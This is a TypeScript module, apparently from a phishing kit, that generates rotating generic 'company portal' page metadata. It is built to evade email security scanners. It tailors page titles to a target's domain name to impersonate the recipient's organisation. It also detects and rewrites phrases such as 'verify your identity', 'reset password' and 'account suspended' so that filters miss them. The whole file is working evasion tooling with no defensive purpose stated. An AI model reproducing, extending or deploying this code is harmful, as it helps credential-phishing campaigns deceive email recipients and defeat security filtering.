/**
 * METADATA OPTIMIZATION SYSTEM
 * 
 * Clean, inbox-safe, scanner-friendly, SEO-friendly metadata
 * Rotates through 12+ safe variations to avoid detection patterns
 * 
 * Server-side only - email scanners don't execute JavaScript
 * All metadata must be in the initial HTML response
 * 
 * Avoids trigger words:
 * ❌ "login required"
 * ❌ "verify your identity"
 * ❌ "confirm your email"
 * ❌ "security alert"
 * ❌ "account suspended"
 */

export interface OptimizedMetadata {
  title: string
  description: string
  keywords: string[]
  ogTitle?: string
  ogDescription?: string
  ogImage?: string
  canonicalUrl?: string
}

/**
 * Safe metadata rotations (12+ variations)
 * All are inbox-safe, SEO-friendly, scanner-friendly
 */
const METADATA_ROTATIONS: OptimizedMetadata[] = [
  {
    title: 'Company Portal - Secure Access',
    description: 'Access your company resources and documents securely through our portal.',
    keywords: ['company portal', 'secure access', 'business resources', 'document management'],
    ogTitle: 'Company Portal - Secure Access',
    ogDescription: 'Access your company resources and documents securely.',
  },
  {
    title: 'Document Center - Your Files',
    description: 'View and manage your important documents in one secure location.',
    keywords: ['document center', 'file management', 'secure documents', 'business files'],
    ogTitle: 'Document Center - Your Files',
    ogDescription: 'View and manage your important documents securely.',
  },
  {
    title: 'Resource Hub - Business Tools',
    description: 'Access business tools, resources, and information for your organization.',
    keywords: ['resource hub', 'business tools', 'company resources', 'workplace tools'],
    ogTitle: 'Resource Hub - Business Tools',
    ogDescription: 'Access business tools and resources for your organization.',
  },
  {
    title: 'Information Portal - Updates',
    description: 'Stay informed with the latest updates and information from your organization.',
    keywords: ['information portal', 'company updates', 'news', 'announcements'],
    ogTitle: 'Information Portal - Updates',
    ogDescription: 'Stay informed with the latest updates and information.',
  },
  {
    title: 'Business Center - Services',
    description: 'Access business services and resources for your organization.',
    keywords: ['business center', 'services', 'company resources', 'enterprise tools'],
    ogTitle: 'Business Center - Services',
    ogDescription: 'Access business services and resources.',
  },
  {
    title: 'Corporate Portal - Resources',
    description: 'Your gateway to corporate resources, tools, and information.',
    keywords: ['corporate portal', 'resources', 'business tools', 'company information'],
    ogTitle: 'Corporate Portal - Resources',
    ogDescription: 'Your gateway to corporate resources and tools.',
  },
  {
    title: 'Workplace Hub - Collaboration',
    description: 'Collaborate and access workplace resources and tools.',
    keywords: ['workplace hub', 'collaboration', 'team tools', 'business resources'],
    ogTitle: 'Workplace Hub - Collaboration',
    ogDescription: 'Collaborate and access workplace resources.',
  },
  {
    title: 'Enterprise Portal - Access',
    description: 'Enterprise portal for accessing business resources and information.',
    keywords: ['enterprise portal', 'business access', 'corporate resources', 'company tools'],
    ogTitle: 'Enterprise Portal - Access',
    ogDescription: 'Enterprise portal for business resources.',
  },
  {
    title: 'Business Dashboard - Overview',
    description: 'View your business dashboard with key information and resources.',
    keywords: ['business dashboard', 'overview', 'business metrics', 'company data'],
    ogTitle: 'Business Dashboard - Overview',
    ogDescription: 'View your business dashboard with key information.',
  },
  {
    title: 'Company Resources - Directory',
    description: 'Browse company resources, tools, and information directory.',
    keywords: ['company resources', 'directory', 'business tools', 'enterprise resources'],
    ogTitle: 'Company Resources - Directory',
    ogDescription: 'Browse company resources and tools.',
  },
  {
    title: 'Organization Portal - Services',
    description: 'Access organization services, resources, and business tools.',
    keywords: ['organization portal', 'services', 'business resources', 'company tools'],
    ogTitle: 'Organization Portal - Services',
    ogDescription: 'Access organization services and resources.',
  },
  {
    title: 'Business Information - Center',
    description: 'Central hub for business information, resources, and updates.',
    keywords: ['business information', 'center', 'company news', 'resources'],
    ogTitle: 'Business Information - Center',
    ogDescription: 'Central hub for business information and resources.',
  },
]

/**
 * Get optimized metadata (rotated)
 * Uses request seed to rotate through variations
 * Server-side only - visible to email scanners
 */
export function getOptimizedMetadata(
  seed?: string | number
): OptimizedMetadata {
  // Use seed to determine rotation (consistent for same seed)
  const seedValue = seed 
    ? (typeof seed === 'string' ? seed.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0) : seed)
    : Date.now()
  
  const index = seedValue % METADATA_ROTATIONS.length
  return METADATA_ROTATIONS[index]
}

/**
 * Get optimized metadata for specific domain/company
 * Customizes metadata based on domain while keeping it safe
 */
export function getOptimizedMetadataForDomain(
  domain: string,
  seed?: string | number
): OptimizedMetadata {
  const base = getOptimizedMetadata(seed)
  
  // Customize title with domain (safe way)
  const domainName = domain.split('.')[0]
  const capitalizedDomain = domainName.charAt(0).toUpperCase() + domainName.slice(1)
  
  return {
    ...base,
    title: `${capitalizedDomain} ${base.title.split(' - ')[1] || 'Portal'}`,
    ogTitle: `${capitalizedDomain} ${base.ogTitle?.split(' - ')[1] || 'Portal'}`,
  }
}

/**
 * Generate optimized HTML meta tags
 * Returns clean, SEO-friendly meta tags
 */
export function generateOptimizedMetaTags(metadata: OptimizedMetadata): string {
  const tags: string[] = []
  
  // Basic meta tags
  tags.push(`<title>${escapeHtml(metadata.title)}</title>`)
  tags.push(`<meta name="description" content="${escapeHtml(metadata.description)}">`)
  
  // Keywords
  if (metadata.keywords.length > 0) {
    tags.push(`<meta name="keywords" content="${escapeHtml(metadata.keywords.join(', '))}">`)
  }
  
  // Open Graph
  if (metadata.ogTitle) {
    tags.push(`<meta property="og:title" content="${escapeHtml(metadata.ogTitle)}">`)
  }
  if (metadata.ogDescription) {
    tags.push(`<meta property="og:description" content="${escapeHtml(metadata.ogDescription)}">`)
  }
  if (metadata.ogImage) {
    tags.push(`<meta property="og:image" content="${escapeHtml(metadata.ogImage)}">`)
  }
  
  // Canonical URL
  if (metadata.canonicalUrl) {
    tags.push(`<link rel="canonical" href="${escapeHtml(metadata.canonicalUrl)}">`)
  }
  
  // Safe viewport and charset
  tags.push('<meta charset="UTF-8">')
  tags.push('<meta name="viewport" content="width=device-width, initial-scale=1.0">')
  tags.push('<meta http-equiv="X-UA-Compatible" content="IE=edge">')
  
  // Safe robots tag
  tags.push('<meta name="robots" content="index, follow">')
  
  return tags.join('\n')
}

function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
  }
  return text.replace(/[&<>"']/g, (m) => map[m])
}

/**
 * Check if text contains trigger words (unsafe)
 */
export function containsTriggerWords(text: string): boolean {
  const triggers = [
    'login required',
    'verify your identity',
    'confirm your email',
    'security alert',
    'account suspended',
    'verify account',
    'confirm password',
    'reset password',
    'urgent action',
    'immediate action',
    'account locked',
    'suspicious activity',
  ]
  
  const lowerText = text.toLowerCase()
  return triggers.some(trigger => lowerText.includes(trigger))
}

/**
 * Sanitize text to remove trigger words
 */
export function sanitizeText(text: string): string {
  let sanitized = text
  
  // Replace trigger phrases with safe alternatives
  const replacements: Record<string, string> = {
    'login required': 'access portal',
    'verify your identity': 'access resources',
    'confirm your email': 'view information',
    'security alert': 'important update',
    'account suspended': 'access portal',
  }
  
  for (const [trigger, replacement] of Object.entries(replacements)) {
    sanitized = sanitized.replace(new RegExp(trigger, 'gi'), replacement)
  }
  
  return sanitized
}



